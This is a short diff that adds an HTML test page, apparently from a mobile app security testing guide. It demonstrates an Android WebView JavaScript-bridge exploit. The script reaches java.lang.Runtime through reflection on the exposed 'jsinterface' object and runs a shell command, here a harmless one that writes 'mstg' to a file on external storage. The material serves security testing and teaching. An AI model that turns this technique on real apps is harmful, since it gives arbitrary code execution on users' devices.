@@ -1,0 +1,25 @@
+<HTML>
+<head>
+
+</head>
+
+<body>
+<h1 style="color: #5e9ca0;">This is a local test page loading a remote JavaScript !</h1>
+
+<!--
+<img src="file:///storage/emulated/0/Bsd_daemon.jpg">
+-->
+<div id="div1"></div>
+
+<script>
+var String = window.jsinterface.getSomeString();
+alert(String);
+
+function execute(cmd){
+  return window.jsinterface.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
+}
+execute(['/system/bin/sh','-c','echo \"mstg\" > /storage/emulated/0/mstg.txt']);
+</script>
+
+</body>
+</HTML>
